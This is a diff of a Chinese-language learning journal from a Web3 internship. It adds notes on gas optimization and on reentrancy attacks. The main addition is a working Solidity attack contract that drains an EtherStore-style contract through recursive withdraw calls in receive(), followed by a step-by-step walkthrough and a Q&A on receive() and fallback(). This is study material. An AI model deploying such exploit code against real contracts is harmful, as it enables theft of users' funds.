@@ -19,7 +19,7 @@ INTJ
 <!-- Content_START -->
 # 2026-01-19
 <!-- DAILY_CHECKIN_2026-01-19_START -->
-# Gas优化的理解：
+# Gas优化：
 
 gas优化，就是尽可能的不与存储在storage上的变量进行操作，并尽可能使用memory来操作变量，
 
@@ -53,10 +53,99 @@ function updateReward(uint256[] memory rewards) public {
 ````
 
 将状态变量转存为局部变量，在**循环（Loop）或者多次读写同一状态变量**时会有质的优化飞跃。
+
+# 重入攻击：
+
+````
+```solidity
+contract Attack {
+    EtherStore public etherStore;
+
+    constructor(address _etherStoreAddress) {
+        etherStore = EtherStore(_etherStoreAddress);
+    }
+
+    // 攻击入口
+    function attack() external payable {
+        require(msg.value >= 1 ether);
+        etherStore.deposit{value: 1 ether}();
+        etherStore.withdraw();
+    }
+
+    // 关键点：当 EtherStore 转账给本合约时，此函数自动触发
+    receive() external payable {
+        if (address(etherStore).balance >= 1 ether) {
+            // 再次调用 withdraw，此时 EtherStore 还没执行到 balances[msg.sender] = 0
+            etherStore.withdraw();
+        }
+    }
+
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
+````
+
+### 1.攻击过程深度分析
+
+1.  **准备**：`EtherStore` 中存有其他用户的 10 ETH。
+    
+2.  **触发**：攻击者调用 `Attack.attack()`，存入 1 ETH 并立即调用 `withdraw()`。
+    
+3.  **第一次交互**：`EtherStore` 执行 `call` 转账给 `Attack`。
+    
+4.  **劫持流**：`Attack` 收到钱，触发 `receive()`，在 `EtherStore` 执行 `balances[msg.sender] = 0` **之前**，再次调用了 `withdraw()`。
+    
+5.  **递归**：`EtherStore` 检查 `require(balances[msg.sender] > 0)`，由于上次调用还没结束，余额依然是 1 ETH，检查通过，再次转账。
+    
+6.  **清空**：这个过程会反复进行，直到 `EtherStore` 的钱被抽干。
+    
+
+## Q&A:
+
+### receive()函数是什么？怎么来的？
+
+1.在 Solidity 0.6.0 版本之前，合约只有一个**回退函数（fallback function）用于处理合约交互失败的逻辑**。无论是因为调用的函数名不存在，还是有人直接转账 ETH，都会挤在这个没有任何名字的函数里。
+
+-   **旧版本的痛点**：由于转账逻辑和异常调用逻辑混在一起，开发者经常忘记检查 `msg.data` 是否为空。这导致有些合约在接收转账时，意外执行了本应报错的逻辑。
+    
+-   **进化**：为了提高安全性，Solidity 官方在 **0.6.0 版本**将这个功能一分为二：
+    
+    1.  `receive()`：专门处理单纯的 ETH 转账（空的 `msg.data`）。
+        
+    2.  `fallback()`：专门处理函数名对不上或者带数据的调用。
+        
+
+可以理解为：`receive()` 函数就是合约的“”自动感应收银机”**。一旦有人向该合约转账 ETH，且没有携带任何附加数据（msg.data为空），这个函数就会被**立即、自动地触发执行。
+
+2\. 职责分离：明确“转账”与“调用”
+
+在早期版本中，所有逻辑都挤在 `fallback()` 函数里。
+
+-   **设计初衷**：通过引入 `receive()`，Solidity 强制开发者将\*\*“纯资金接收”**逻辑与**“无效合约调用”\*\*逻辑分开。
+    
+-   **安全价值**：这防止了用户本想给合约转账，却意外触发了合约中复杂的逻辑，或者本想调用一个不存在的函数，却意外完成了转账。
+    
+
+3.防止“资金黑洞” (Security by Default)
+
+这是设计上最重要的安全改进。
+
+-   **老问题**：以前如果你向一个没有编写任何接收逻辑的合约转账，有些合约会默认接收并“吞掉”这笔钱，而由于没有代码逻辑，这笔钱可能永远无法提取。
+    
+-   **新方案**：在 0.6.0 之后的版本中，如果你的合约**没有**显式声明 `receive()` 函数，那么任何外部向该合约的纯 ETH 转账都会被 EVM **直接拒绝（Revert）**。
+    
+-   **意义**：这保护了用户，确保钱只能进入那些“做好了收钱准备”的合约。
+    
+
+所以，重入攻击就是利用合约的执行顺序错误，也就是**“检查-效果-交互”**模式，它在实际扣除用户余额之前，就先进行了转账交互。
+
+使攻击者利用攻击合约无限提取资金。
 <!-- DAILY_CHECKIN_2026-01-19_END -->
 
 # 2026-01-18
 <!-- DAILY_CHECKIN_2026-01-18_START -->
+
 
 
 # 今日感悟：
@@ -66,6 +155,7 @@ web3实习计划第一周结束了，这是我第一次以一名学员的身份�
 
 # 2026-01-17
 <!-- DAILY_CHECKIN_2026-01-17_START -->
+
 
 
 
@@ -83,6 +173,7 @@ web3实习计划第一周结束了，这是我第一次以一名学员的身份�
 
 # 2026-01-16
 <!-- DAILY_CHECKIN_2026-01-16_START -->
+
 
 
 
@@ -114,6 +205,7 @@ web3实习计划第一周结束了，这是我第一次以一名学员的身份�
 
 
 
+
 # 今天做了什么：
 
 1.  对昨晚的直播，Web3合规内容进行整理，并上传到个人知识库。
@@ -135,6 +227,7 @@ web3实习计划第一周结束了，这是我第一次以一名学员的身份�
 
 # 2026-01-14
 <!-- DAILY_CHECKIN_2026-01-14_START -->
+
 
 
 
@@ -216,6 +309,7 @@ web3实习计划第一周结束了，这是我第一次以一名学员的身份�
 
 
 
+
 # 今日目标：
 
 1.  参加下午的Co-Learning
@@ -231,6 +325,7 @@ web3实习计划第一周结束了，这是我第一次以一名学员的身份�
 
 # 2026-01-12
 <!-- DAILY_CHECKIN_2026-01-12_START -->
+
 
 
 
